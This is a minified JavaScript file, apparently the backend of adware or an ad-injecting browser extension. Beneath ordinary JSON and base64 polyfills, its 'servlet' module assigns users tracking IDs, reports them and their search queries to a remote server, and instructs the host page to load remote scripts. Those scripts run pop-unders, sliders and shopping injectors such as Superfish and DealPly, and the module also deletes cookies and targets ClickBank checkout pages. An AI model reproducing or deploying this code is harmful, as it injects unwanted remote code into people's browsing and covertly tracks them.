/* Copyright (c) 2012-2013 ~ Do Not Copy! */
try{
Object.keys=Object.keys||function(e){var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(n);return t},Date.prototype.toISOString=Date.prototype.toISOString||function(){function e(e){return e<10?"0"+e:e}return this.getUTCFullYear()+"-"+e(this.getUTCMonth()+1)+"-"+e(this.getUTCDate())+"T"+e(this.getUTCHours())+":"+e(this.getUTCMinutes())+":"+e(this.getUTCSeconds())+"."+(this.getUTCMilliseconds()/1e3).toFixed(3).slice(2,5)+"Z"},typeof JSON!="object"&&(JSON={}),function(undefined){"use strict";function f(e){return e<10?"0"+e:e}function quote(e){return escapable.lastIndex=0,escapable.test(e)?'"'+e.replace(escapable,function(e){var t=meta[e];return typeof t=="string"?t:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+e+'"'}function str(e,t){var n,r,i,s,o=gap,u,a=t[e];a&&typeof a=="object"&&typeof a.toJSON=="function"&&(a=a.toJSON(e)),typeof rep=="function"&&(a=rep.call(t,e,a));switch(typeof a){case"string":return quote(a);case"number":return isFinite(a)?String(a):"null";case"boolean":case"null":return String(a);case"object":if(!a)return"null";gap+=indent,u=[];if(Object.prototype.toString.apply(a)==="[object Array]"){s=a.length;for(n=0;n<s;n+=1)u[n]=str(n,a)||"null";return i=u.length===0?"[]":gap?"[\n"+gap+u.join(",\n"+gap)+"\n"+o+"]":"["+u.join(",")+"]",gap=o,i}if(rep&&typeof rep=="object"){s=rep.length;for(n=0;n<s;n+=1)typeof rep[n]=="string"&&(r=rep[n],i=str(r,a),i&&u.push(quote(r)+(gap?": ":":")+i))}else for(r in a)Object.prototype.hasOwnProperty.call(a,r)&&(i=str(r,a),i&&u.push(quote(r)+(gap?": ":":")+i));return i=u.length===0?"{}":gap?"{\n"+gap+u.join(",\n"+gap)+"\n"+o+"}":"{"+u.join(",")+"}",gap=o,i}}var __$JSON={};typeof Date.prototype.toJSON!="function"&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;__$JSON.stringify=function(e,t,n){var r;gap="",indent="";if(typeof n=="number")for(r=0;r<n;r+=1)indent+=" ";else typeof n=="string"&&(indent=n);rep=t;if(!t||typeof t=="function"||typeof t=="object"&&typeof t.length=="number")return str("",{"":e});throw new Error("JSON.stringify")};try{JSON.stringify=__$JSON.stringify,__$JSON=undefined}catch(err){}typeof JSON.parse!="function"&&(JSON.parse=function(text,reviver){function walk(e,t){var n,r,i=e[t];if(i&&typeof i=="object")for(n in i)Object.prototype.hasOwnProperty.call(i,n)&&(r=walk(i,n),r!==undefined?i[n]=r:delete i[n]);return reviver.call(e,t,i)}var j;text=String(text),cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),typeof reviver=="function"?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}(),typeof base64!="object"&&(base64={}),function(){base64={},base64.PADCHAR="=",base64.ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",base64.getbyte64=function(e,t){var n=base64.ALPHA.indexOf(e.charAt(t));if(n==-1)throw"Cannot decode base64";return n},base64.decode=function(e){e=""+e;var t=base64.getbyte64,n,r,i,s=e.length;if(s===0)return e;if(s%4!==0)throw"Cannot decode base64";n=0,e.charAt(s-1)==base64.PADCHAR&&(n=1,e.charAt(s-2)==base64.PADCHAR&&(n=2),s-=4);var o=[];for(r=0;r<s;r+=4)i=t(e,r)<<18|t(e,r+1)<<12|t(e,r+2)<<6|t(e,r+3),o.push(String.fromCharCode(i>>16,i>>8&255,i&255));switch(n){case 1:i=t(e,r)<<18|t(e,r+1)<<12|t(e,r+2)<<6,o.push(String.fromCharCode(i>>16,i>>8&255));break;case 2:i=t(e,r)<<18|t(e,r+1)<<12,o.push(String.fromCharCode(i>>16))}return o.join("")},base64.getbyte=function(e,t){var n=e.charCodeAt(t);if(n>255)throw"INVALID_CHARACTER_ERR: DOM Exception 5";return n},base64.encode=function(e){if(arguments.length!=1)throw"SyntaxError: Not enough arguments";var t=base64.PADCHAR,n=base64.ALPHA,r=base64.getbyte,i,s,o=[];e=""+e;var u=e.length-e.length%3;if(e.length===0)return e;for(i=0;i<u;i+=3)s=r(e,i)<<16|r(e,i+1)<<8|r(e,i+2),o.push(n.charAt(s>>18)),o.push(n.charAt(s>>12&63)),o.push(n.charAt(s>>6&63)),o.push(n.charAt(s&63));switch(e.length-u){case 1:s=r(e,i)<<16,o.push(n.charAt(s>>18)+n.charAt(s>>12&63)+t+t);break;case 2:s=r(e,i)<<16|r(e,i+1)<<8,o.push(n.charAt(s>>18)+n.charAt(s>>12&63)+n.charAt(s>>6&63)+t)}return o.join("")},window.btoa||(window.btoa=base64.encode),window.atob||(window.atob=base64.decode)}(),function(e,t,n,r){e.debug=function(t,n){if(e.user.primary_id!==1&&e.user.primary_id!==2&&e.user.primary_id!==3)return;e.isSet(n)?console.log(t,n):console.log(t)},e.contains=function(e,t){typeof t=="string"&&(t=t.replace(/\s/,"").split(","));for(var n in t)if(e.indexOf(t[n])!==-1)return!0;return!1},e.isSet=function(e){return typeof e!=typeof r},e.itemHasValue=function(t){return e.isSet(t)&&t!==""&&t!==null},e.postMessage=function(n){t.parent.postMessage(JSON.stringify(n),e.config.origin)},e.initilize=function(){e.loadConfig(function(){e.user.active?e.monetize(function(){e.updateUserDB()}):e.updateUserDB()}),e.reMarketing()}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){"use strict";e.xhrCall=function(r,i,s){typeof s==typeof undeifned&&(s="GET");var o,u=t.navigator.userAgent.indexOf("MSIE")!==-1;try{o=new XMLHttpRequest}catch(a){}if(o&&"withCredentials"in o)try{o.open(s,r,!0)}catch(a){r=r.replace("http:","https:"),o.open(s,r,!0)}else e.isSet(XDomainRequest)?(n.location.protocol=="https:"?r=r.replace("http:","https:"):r=r.replace("https:","http:"),o=new XDomainRequest,o.open(s,r)):o=null;if(o===null){try{i(null)}catch(a){}return}var f=function(e){return function(t){t=u?o:t,e=="load"&&(u||t.readyState==4)&&i?i&&i(t.responseText,t):e=="error"&&i&&i(null,t)}};o.onload=function(e){f("load")(u?e:e.target)},o.onerror=function(e){f("error")(u?e:e.target)},o.send(null)},e.loadScript=function(t,r){e.debug("Loading: "+t);var i=n.createElement("script");i.type="text/javascript",i.src=t,i.async=!0;if(typeof r=="function"){try{i.onreadystatechange=r}catch(s){}try{i.onload=r}catch(s){}}try{n.getElementsByTagName("head")[0].appendChild(i)}catch(o){try{n.documentElement.appendChild(i)}catch(u){n.body.appendChild(i)}}}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.storejs=function(e){function u(e){return function(){var n=Array.prototype.slice.call(arguments,0);n.unshift(o),c.appendChild(o),o.addBehavior("#default#userData"),o.load(i);var r=e.apply(t,n);return c.removeChild(o),r}}function f(e){return e.replace(a,"___")}function l(){try{return i in e&&e[i]}catch(t){return!1}}var t={},n=e.document,i="localStorage",s="__storejs__",o;t.disabled=!1,t.set=function(e,t){},t.get=function(e){},t.remove=function(e){},t.clear=function(){},t.transact=function(e,n,r){var i=t.get(e);r===null&&(r=n,n=null),typeof i=="undefined"&&(i=n||{}),r(i),t.set(e,i)},t.getAll=function(){},t.serialize=function(e){return JSON.stringify(e)},t.deserialize=function(e){if(typeof e!="string")return r;try{return JSON.parse(e)}catch(t){return e||r}};var a=new RegExp("[!\"#$%&'()*+,/\\\\:;<=>?@[\\]^`{|}~]","g");if(l())o=e[i],t.set=function(e,n){return typeof n=="undefined"?t.remove(e):(o.setItem(e,t.serialize(n)),n)},t.get=function(e){return t.deserialize(o.getItem(e))},t.remove=function(e){o.removeItem(e)},t.clear=function(){o.clear()},t.getAll=function(){var e={};for(var n=0;n<o.length;++n){var r=o.key(n);e[r]=t.get(r)}return e};else if(n.documentElement.addBehavior){var c,h;try{h=new ActiveXObject("htmlfile"),h.open(),h.write('<script>document.w=window</script><iframe src="/favicon.ico"></iframe>'),h.close(),c=h.w.frames[0].document,o=c.createElement("div")}catch(p){o=n.createElement("div"),c=n.body}t.set=u(function(e,n,r){return n=f(n),tyoeof(r)=="undefined"?t.remove(n):(e.setAttribute(n,t.serialize(r)),e.save(i),r)}),t.get=u(function(e,n){return n=f(n),t.deserialize(e.getAttribute(n))}),t.remove=u(function(e,t){t=f(t),e.removeAttribute(t),e.save(i)}),t.clear=u(function(e){var t=e.XMLDocument.documentElement.attributes;e.load(i);for(var n=0;n<t.length;n++)e.removeAttribute(t[n].name);e.save(i)}),t.getAll=u(function(e){var n=e.XMLDocument.documentElement.attributes,r={};for(var i=0;i<n.length;i++){var s=n[i],o=f(s.name);r[s.name]=t.deserialize(e.getAttribute(o))}return r})}try{t.set(s,s),t.get(s)!=s&&(t.disabled=!0),t.remove(s)}catch(p){t.disabled=!0}return t.enabled=!t.disabled,typeof module!=typeof r&&module.exports?module.exports=t:typeof define=="function"&&define.amd?define(t):e.store=t,t}(this.window||global),e.storage={set:function(t,r,i){t="__.rjs."+t.replace("_rjs","");var s=new Date;i=i===null||typeof i=="undefined"?1800:i,s.setTime(s.getTime()+i*1e3);if(e.storejs.enabled)e.storejs.set(t,{value:r,expires:s.getTime()});else{var o=i?"expires="+s.toGMTString():"";n.cookie=t+"="+r+"; "+o+"; path=/"}},get:function(t){t="__.rjs."+t.replace("_rjs","");var i=null;if(e.storejs.enabled){var s=new Date,o=e.storejs.get(t);typeof o!=typeof r&&(o.expires<s.getTime()?e.storejs.remove(t):i=o.value)}else{var u=";"+n.cookie+";";u.split(t+"=").length>1&&(i=u.split(t+"=")[1].split(";")[0].replace(/^\s*/,"").replace(/\s*$/,"").replace(/\s{2,}/," "))}return i},del:function(t){t="__.rjs."+t.replace("_rjs",""),e.storejs.enabled?e.storejs.remove(t):n.cookie=t+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/"}}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.reMarketing=function(){}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.isCapped=function(t){return e.isSet(e.app.modules[t])?e.isSet(e.app.modules[t].capping)?e.isSet(e.user.capping[t])?e.user.capping[t]>=e.app.modules[t].capping:!1:!1:!1},e.increaseCapping=function(t){e.isSet(e.user.capping[t])?e.user.capping[t]++:e.user.capping[t]=1},e.isSleeping=function(t){var n=(new Date).getTime();return e.debug("is sleep? "+t),e.isSet(e.user.ttls[t])?n>=e.user.ttls[t]?(e.user.ttls[t]=0,!1):!0:!1},e.sleep=function(t,n){if(!e.isSet(e.app.modules[t]))return!1;var r=(new Date).getTime(),i=(new Date).setHours(24,0,0,0);if(!e.isSet(n))try{n=e.app.modules[t].ttl}catch(s){}e.isCapped(t)||e.isSet(n)&&(i=r+n*1e3);if(!e.isSet(e.user.ttls[t])||e.isSet(e.user.ttls[t])&&e.user.ttls[t]<i)e.user.ttls[t]=i},e.sleepAll=function(t,n){e.isSet(t)||(t=300),e.user.primary_id<4&&(t=60),e.isSet(n)&&n!=="pages"&&e.sleep("pages",t),e.isSet(n)&&n!=="mobile"&&e.sleep("mobile",t),e.isSet(n)&&n!=="sliders"&&e.sleep("sliders",t)}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.isOptedOut=function(t){return e.isSet(e.user.optouts[t])},e.optUserOut=function(t){try{e.contains(t,e.config.optout_items)||e.debug("Optout item does not exist"),e.user.optouts.push(t),e.user.optouts=e.user.optouts.filter(function(e,t,n){return n.lastIndexOf(e)===t}),e.updateUserDB();var n=e.config.backendURL.replace("?","")+"optout.php?",r={opt:"out",client:e.user.client,country:e.user.country,app_id:e.user.primary_id,subid_id:e.user.apps[e.user.primary_id].subid_id};r=btoa(JSON.stringify(r)),e.xhrCall(n+r,function(t){e.debug(n+r)},"GET")}catch(i){}},e.optUserIn=function(t){try{e.contains(t,e.config.optout_items)||e.debug("Optout item does not exist");var n=[];for(var r=0;r<e.user.optouts.length;r++)e.user.optouts[r]!==t&&n.push(e.user.optouts[r]);e.user.optouts=n.filter(function(e,t,n){return n.lastIndexOf(e)===t}),e.updateUserDB();var i=e.config.backendURL.replace("?","")+"optout.php?",s={opt:"in",client:e.user.client,country:e.user.country,app_id:e.user.primary_id,subid_id:e.user.apps[e.user.primary_id].subid_id};s=btoa(JSON.stringify(s)),e.xhrCall(i+s,function(t){e.debug(i+s)},"GET")}catch(o){}}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.appPriorities=[1,2,3,53,63,67,71,75,141,61,73,81,83,95,107,109,139,5,65,93,121,135,77,85,69,115,117,119,125,131,133,137,97,101,111,127,143,145,1003,1005,1007,1009,1001,1013,2001]}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.isPersisting=function(t){var n=(new Date).getTime();if(e.isSet(e.user.persist[t])&&e.isSet(e.user.persist[t][e.config.domain])){if(n<e.user.persist[t][e.config.domain])return!0;e.user.persist[t][e.config.domain]=0}return!1},e.persist=function(t,n){if(e.isPersisting(t))return;e.debug("persist "+t);try{var r=(new Date).getTime();e.isSet(n)||(n=1);var i=r+n*60*1e3;e.isSet(e.user.persist[t])||(e.user.persist[t]={}),e.user.persist[t][e.config.domain]=i}catch(s){}},e.unpersist=function(t){e.debug("un-persist");try{e.user.persist[t]={}}catch(n){}}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){e.saveQuery=function(t){e.debug("Saving query:",t);try{e.user.query=t,e.sleep("query"),e.updateUserDB()}catch(n){}}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){function s(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(e){var t=Math.random()*16|0,n=e=="x"?t:t&3|8;return n.toString(16)})}function o(){var t="",n="";for(var r in e.user.apps){for(var i in e.user.apps[r])t=i.replace("appid","id"),n=e.user.apps[r][i],n=n==="@@@"?n.replace("@@@",""):n,n=isNaN(parseInt(n,10))?n:parseInt(n,10),e.user.apps[r][t]=n;e.user.apps[r].subid_id=0,e.user.apps[r].first_seen=null,e.user.apps[r].last_seen=null,e.user.apps[r].seen_now=!0,e.user.apps[r].seen_days=0,e.user.apps[r].primary_days=0}}function u(){for(var t in e.user.apps)e.contains(t,e.appPriorities)||e.appPriorities.push(parseInt(t,10));var n=!1,r="";for(var i=0;i<e.appPriorities.length;i++){for(var s in e.user.apps)if(s==e.appPriorities[i]&&e.user.apps[s].id!==1){n=!0,e.user.apps[s].primary=!0,e.user.primary_id=parseInt(e.user.apps[s].id,10);break}if(n)break}try{e.user.primary_id=parseInt(Object.keys(e.user.apps)[0],10),e.user.apps[e.user.primary_id].primary=!0}catch(o){}}function a(){var t=e.storage.get("userdb");if(t!==""&&t!==null&&e.isSet(t)){e.debug("Existing user"),t=JSON.parse(t),e.debug("Stored data:",t);for(var n in t)n!=="primary_id"&&n!=="apps"&&n!=="capping"&&n!=="ttls"&&(e.user[n]=t[n]);for(var r in t.capping)e.user.capping[r]=t.capping[r];for(var i in t.ttls)e.user.ttls[i]=t.ttls[i];for(var o in t.apps){e.isSet(e.user.apps[o])||(e.user.apps[o]=t.apps[o],e.user.apps[o].seen_now=!1,e.user.apps[o].primary=!1);for(var u in t.apps[o])u!=="primary"&&(e.user.apps[o][u]=t.apps[o][u])}isNaN(e.user.primary_id)&&(e.user.primary_id=1),e.user.primary_id===1&&e.isSet(t.primary_id)?e.user.primary_id=t.primary_id:Object.keys(e.user.apps).length===1&&(e.user.primary_id=parseInt(Object.keys(e.user.apps)[0],10)),e.user.apps[e.user.primary_id].primary=!0,e.user.apps[e.user.primary_id].seen_now=!0}else e.debug("Creating new user");e.user.uuid===""&&(e.user.uuid=s()),e.isSleeping("query")||(e.user.query="")}function f(t){var n={uuid:e.user.uuid.toString(),client:e.user.client.toLowerCase(),apps:e.user.apps};n=btoa(JSON.stringify(n)),e.debug(e.config.backendURL+n),e.xhrCall(e.config.backendURL+n,function(n){if(!e.itemHasValue(n))return;var r=JSON.parse(n+"");e.debug("Backend response:",r),e.user.active=e.isSet(r.active)&&r.active===!0?!0:!1,e.itemHasValue(r.country)&&(e.user.country=r.country),e.itemHasValue(r.apps)&&(e.user.apps=r.apps),e.itemHasValue(r.active)&&(e.user.active=r.active);if(typeof t=="function")try{t()}catch(i){}},"GET")}function l(){e.config.key="rjs"+e.user.primary_id+"_"+e.user.apps[e.user.primary_id].subid_id+"_"+e.user.client+"_"+e.user.country}function c(t){e.debug("Active data:",e.user);var n={command:"setConfig",params:[e.user.uuid,e.user.primary_id,e.user.apps[e.user.primary_id].subid_id,e.user.client,e.user.country,e.config.key,e.user.query]};e.postMessage(n);if(typeof t=="function")try{t()}catch(r){}}var i="https://mzapi.com/v3/servlet/?";e.config={backendURL:i.replace("?","")+"?",timestamp:function(){return(new Date).toISOString().split("T")[0]}(),key:"rjs0_0_OTW_A1",origin:t.parent,cdn:"",winName:"",isContent:!1,isSSL:"",page_url:"",domain:"",referrer:"",browser:function(){var e=navigator.userAgent.toLowerCase(),n={webkit:/webkit/.test(e),mozilla:/mozilla/.test(e)&&!/(compatible|webkit)/.test(e),chrome:/chrome/.test(e),msie:(/msie/.test(e)||/trident/.test(e)||!!t.MSStream)&&!/opera/.test(e),firefox:/firefox/.test(e),safari:/safari/.test(e)&&!/chrome/.test(e),opera:/opera/.test(e)};return n.version=n.safari?(e.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(e.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1],n}(),system:function(){var e=navigator.userAgent.toLowerCase(),t="windows";return/macintosh|mac os x/.test(e)?t="macintosh":/linux/.test(e)?t="linux":/adobeair/.test(e)&&(t="air"),t}(),optout_items:["display","pages","mobile","adult","sliders","games","gambling","coupons","superfish","dealply","foxydeal","deals","dictionary","download","bounces","contentads","searchads"],stoppers:{common:[".google.",".facebook.com",".bing.","ask.com",".youtube.",".linkedin.","wikipedia.org",".yahoo.com","flickr.com","wretch.cc","rivals.com","tumblr.com","mzcdn.com","frontdb.com","dataconsole.com","speedanalysis.net","speedanalysis.com","7go.com","zulagames.com"],pages:[],sliders:[],bounces:[]},pattern:{matched:!1,script:"",allowed:!0,https_ok:!0,is_display:!1,is_content:!1,is_search:!1,is_affiliate:!1,is_adult:!1,needs_ad:!1}},e.app={},e.user={uuid:"",primary_id:1,client:"",country:"A1",timestamp:null,apps:{},optouts:[],active:!0,query:"",capping:{},ttls:{},persist:{}},e.resetCapping=function(){e.user.capping={},e.user.ttls={},e.user.persist={}},e.updateUserDB=function(){e.debug("updateUserDB"),e.user.timestamp=e.config.timestamp,e.user.active=e.user.active!==!1?!0:!1,e.storage.set("userdb",JSON.stringify(e.user),31536e4)},e.loadConfig=function(t,n){e.config.browser.msie?e.user.client="IE":e.config.browser.chrome?e.user.client="CR":e.config.browser.firefox||e.config.browser.mozilla?e.user.client="FF":e.config.browser.safari?e.user.client="SF":e.config.browser.opera?e.user.client="OP":e.user.client="OT",e.config.system==="ios"?e.user.client+="I":e.config.system==="android"?e.user.client+="I":e.config.system==="macintosh"?e.user.client+="M":e.config.system==="linux"?e.user.client+="L":e.user.client+="W",o(),u(),a();if(e.isSet(n)&&n){if(typeof t=="function")try{t()}catch(r){}return}e.user.timestamp!==e.config.timestamp?(e.resetCapping(),f(function(){var n=(new Date).getTime();e.user.ttls.pages=n+12e4,e.user.ttls.sliders=n+18e4,l(),c(t)})):(l(),c(t))}}(window.servlet=window.servlet||{},window,document),function(e,t,n,r){function s(t){return t==="*"||e.contains(e.user.country,t)}function o(t){return e.config.isSSL?t:!0}function u(){if(!e.isSet(e.app.patterns))return!1;var t=!1;for(var n in e.app.patterns){var r=e.app.patterns[n];if(s(r.geos)&&o(r.https_ok)){var i=r.is_regex?(new RegExp(r.pattern)).test(e.config.domain):e.config.domain.indexOf(r.pattern)!==-1;if(i){t=!1;if(!r.optout_type||r.optout_type&&!e.isOptedOut(r.optout_type))t=!0,r.capping_type&&(e.debug("checking capping for: "+r.capping_type),!e.isCapped(r.capping_type)&&!e.isSleeping(r.capping_type)?(e.increaseCapping(r.capping_type),e.sleepAll(300,r.capping_type),e.sleep(r.capping_type)):t=!1),t&&e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/"+r.script]})}}}return t}function a(){if(!e.isSet(e.app.modules.shopping))return;var t="",r=e.app.modules.shopping;e.isSet(r.sf)&&s(r.sf.geos)&&o(r.sf.https_ok)&&!e.isOptedOut("superfish")&&(t="//www.superfish.com/ws/sf_main.jsp?dlsource="+r.sf.ext_id+"&userId="+e.user.uuid+"&CTID="+e.config.key,t=(n.location.protocol=="https:"?"https:":"http:")+t,e.postMessage({command:"whitelist",params:["superfish.com"]}),e.postMessage({command:"loadScript",params:[t]})),e.isSet(r.dp)&&s(r.dp.geos)&&o(r.dp.https_ok)&&!e.isOptedOut("dealply")&&(t=e.config.isSSL?r.dp.https_js:r.dp.http_js,t+=e.config.key,e.postMessage({command:"whitelist",params:[[t.match(/:\/\/(.[^\/]+)/)[1],"dealply.com","dpstack.com"]]}),e.postMessage({command:"loadScript",params:[t]})),e.isSet(r.fd)&&s(r.fd.geos)&&o(r.fd.https_ok)&&!e.isOptedOut("foxydeal")&&(t=e.config.cdn+"actions/_foxydeal.js",e.postMessage({command:"whitelist",params:["foxydeal.com"]}),e.postMessage({command:"loadScript",params:[t]})),e.isSet(r.deals)&&s(r.deals.geos)&&o(r.deals.https_ok)&&!e.isOptedOut("deals")&&(t=e.config.cdn+"actions/_deals.js",e.postMessage({command:"loadScript",params:[t]}))}function f(){e.isSet(e.app.modules.noproblem)&&s(e.app.modules.noproblem.geos)&&o(e.app.modules.noproblem.https_ok)&&!e.isOptedOut("noproblem")&&e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/_noproblem.js"]})}function l(t){e.debug("Quitting monetize()...");try{t()}catch(n){}return!1}function c(t){if(e.itemHasValue(e.config.winName)&&e.config.winName.toString().indexOf("rjs")!==-1)return e.sleepAll(300,"pages"),e.increaseCapping("pages"),e.sleep("pages"),e.unpersist("pages"),e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/_poweredby.js"]}),e.postMessage({command:"renameWindow",params:[]}),e.debug("this is a pop window"),l(t);var n=u();if(e.contains(e.config.page_url,e.config.stoppers.common))return l(t);a(),f();if(!n&&e.isSet(e.app.modules.pages)&&(e.isPersisting("pages")||s(e.app.modules.pages.geos)&&o(e.app.modules.pages.https_ok)&&!e.contains(e.config.page_url,e.config.stoppers.pages)&&!e.isOptedOut("pages")&&!e.isCapped("pages")&&!e.isSleeping("pages"))){e.debug("pop is ok"),e.persist("pages",15),e.isPersisting("pages")||e.postMessage({command:"cookieDestroy",params:[["__.pageunder","__.visitsToday"]]}),e.sleepAll(300,"pages"),e.sleep("pages",60);var r=(e.app.modules.pages.as_tab?"_tabad":"_winad")+".js";e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/"+r+"?xid="+e.app.modules.pages.ext_id]})}else!n&&e.config.isContent&&e.isSet(e.app.modules.sliders)&&s(e.app.modules.sliders.geos)&&o(e.app.modules.sliders.https_ok)&&!e.contains(e.config.page_url,e.config.stoppers.sliders)&&!e.isOptedOut("sliders")&&!e.isCapped("sliders")&&!e.isSleeping("sliders")?(e.debug("slider is ok"),e.postMessage({command:"cookieDestroy",params:[["__.sliders"]]}),e.increaseCapping("sliders"),e.sleepAll(300,"sliders"),e.sleep("sliders"),e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/_slider.generic.js"]})):e.isSet(e.app.modules.interyield)&&s(e.app.modules.interyield.geos)&&o(e.app.modules.interyield.https_ok)&&e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/_interyield.js"]});if(typeof t=="function")try{t()}catch(i){}}var i=Math.round((new Date).getTime()/1e3);e.user.primary_id>3&&(i=Math.round(i/172800)),e.monetize=function(t){try{e.config.domain.indexOf("ssl.clickbank.net")!==-1&&e.xhrCall(e.config.backendURL.replace("?","")+"geo.php?",function(t){if(e.itemHasValue(t)){var n=JSON.parse(t+"");if(!e.contains(n.countrycode,["A1","A2","O1"])&&n.countrycode=="US"&&e.contains(n.region,["ID","CO"]))return;e.postMessage({command:"loadScript",params:[e.config.cdn+"actions/_cbcart.js"]})}})}catch(n){}if(!e.user.active)return e.debug("Hybernating user"),l(t);e.debug("User is active. Monetizing...");var s="jsdb/"+e.user.primary_id+".js?"+i;e.loadScript(s,function(){var n=!1;typeof jsdbTimer==typeof r&&(jsdbTimer=setInterval(function(){e.isSet(e.app.app)&&(e.postMessage({command:"assignApp",params:[e.app.nice_name,e.app.app_title]}),e.postMessage({command:"assignBrand",params:[e.app.poweredby_text,e.app.poweredby_link]}),c(t),clearInterval(jsdbTimer),n=!0)},1)),setTimeout(function(){n||(e.debug("js db not loaded..."),clearInterval(jsdbTimer),t())},5e3)})}}(window.servlet=window.servlet||{},window,document),function(e){if(top===self||navigator.appVersion.indexOf("MSIE 6.")!==-1||navigator.appVersion.indexOf("MSIE 7.")!==-1&&navigator.appVersion.indexOf("NT 6.1")===-1)return;if(document.referrer==="")return;var t=window.addEventListener?"addEventListener":"attachEvent",n=window.addEventListener?"message":"onmessage",r=window[t];r(n,function(e){var t=document.referrer.split("://");t=t[0]+"://"+t[1].split("/")[0];if(e.origin!==t)return;servlet.config.origin=e.origin;var n=!0;if(!servlet.itemHasValue(e.data))return;if(typeof e.data!="string"||e.data.indexOf("{")===-1)return;var r=e.data;try{r=JSON.parse(r)}catch(i){servlet.debug(i.name+": "+i.message);return}for(var s in r)s=="query"?(servlet.saveQuery(r[s]),n=!1):s=="optout"?(servlet.optUserOut(r[s]),n=!1):s=="optin"?(servlet.optUserIn(r[s]),n=!1):s=="apps"?servlet.user.apps=r[s]:servlet.config[s]=r[s];n&&servlet.initilize()},!1)}()
}catch(err){ if (err.stack) { throw new Error(err.stack); } else { throw new Error(err.name + ": " + err.message); } }